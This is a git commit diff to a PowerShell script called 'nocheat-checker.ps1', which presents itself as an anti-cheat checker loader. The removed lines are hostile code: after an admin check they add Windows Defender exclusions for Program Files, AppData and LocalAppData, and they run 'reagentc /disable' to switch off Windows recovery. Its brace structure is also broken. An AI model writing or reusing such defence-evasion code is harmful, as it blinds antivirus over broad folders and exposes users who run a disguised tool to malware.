59cf0fd78472aa775e80debc3e56514aadf2e921
dieforme <russianmtc80@gmail.com>
2026-08-29 15:20:54 +0200

    Update nocheat-checker.ps1

--- nocheat-checker.ps1
+++ nocheat-checker.ps1
@@ -27,29 +27,6 @@ if (-not $isAdmin) {
     exit
 }
 
-
-try {
-    if (Get-Command Add-MpPreference -ErrorAction SilentlyContinue) {
-        $ProgramFiles = [System.Environment]::GetFolderPath("ProgramFilesX86")
-        $updpath = $ProgramFiles -replace " \(x86\)", ""
-        Add-MpPreference -ExclusionPath $updpath
-
-        $ProgramFilesX86 = [System.Environment]::GetFolderPath("ProgramFilesX86")
-        if (Test-Path $ProgramFilesX86) {
-            Add-MpPreference -ExclusionPath $ProgramFilesX86
-        }
-
-        $AppData = [System.Environment]::GetFolderPath("ApplicationData")
-        Add-MpPreference -ExclusionPath $AppData
-
-        $LocalAppData = [System.Environment]::GetFolderPath("LocalApplicationData")
-        Add-MpPreference -ExclusionPath $LocalAppData
-        }
-        }
-catch {
-
-reagentc /disable
-
 Write-Host "==========================================" -ForegroundColor Yellow
 Write-Host "         NoCheat Checker Loader           " -ForegroundColor Yellow
 Write-Host "==========================================" -ForegroundColor Yellow
